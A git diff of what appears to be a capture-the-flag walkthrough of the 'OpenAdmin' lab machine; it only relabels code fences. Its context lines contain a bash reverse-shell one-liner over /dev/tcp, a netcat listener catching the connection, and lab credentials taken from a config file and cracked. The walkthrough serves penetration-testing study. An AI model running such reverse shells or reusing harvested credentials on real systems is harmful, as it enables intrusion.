@@ -147,8 +147,8 @@ full working reverse shell.
 
 > Payload:
 
-```bash
-$ bash -c 'bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1'
+```console
+bash -c 'bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1'
 ```
 
 > Encoded payload
@@ -160,7 +160,7 @@ $ bash -c 'bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1'
 Now we have to start a netcat listener on our desired port, then enter the url encoded 
 string to our shell to get the reverse shell.
 
-```bash
+```console
 $ nc -lnvp 9001
 listening on [any] 9001 ...
 connect to [10.10.14.3] from (UNKNOWN) [10.10.10.171] 54470
@@ -214,7 +214,7 @@ Please notice that this only works with bash. If you are using zsh you may ran i
 At first we start with some basic manually enumeration on the `/var/www/` directory to see what
 we get.
 
-```bash
+```console
 www-data@openadmin:/var/www$ ls -la
 ls -la
 total 16
@@ -269,7 +269,7 @@ joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
 
 So we have another user. Let's take that to our nodes.
 
-```bash
+```console
 User: jimmy
 User: joanna
 ```
@@ -308,7 +308,7 @@ $ona_contexts=array (
 
 And we are lucky to get credentials for the mysql database.
 
-```bash
+```console
 User: ona_sys
 Password: n1nj4W4rri0R!
 ```
@@ -423,7 +423,7 @@ Session completed
 
 Awesome! We get the password.
 
-```bash
+```console
 Password: bloodninjas
 ```
 
